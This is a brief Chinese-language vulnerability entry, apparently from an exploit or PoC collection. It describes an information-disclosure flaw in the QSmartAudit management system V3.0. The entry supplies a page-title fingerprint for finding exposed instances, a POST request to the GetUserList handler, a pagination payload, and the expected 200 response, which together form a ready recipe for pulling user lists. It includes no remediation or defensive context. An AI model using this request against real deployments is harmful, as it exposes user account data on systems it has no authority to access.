# QSmartAudit管理系统存在敏感信息泄露漏洞

QSmartAudit ｜ 信息泄露 ｜ —
- **指纹**：`title="QSmart Audit管理系统V3.0"`
- **请求**：`POST /service/SystemManageHandler.ashx?action=GetUserList HTTP/1.1`

**Payload**
```
pageIndex=0&pageSize=20&sortField=&sortOrder=
```
- **响应特征**：200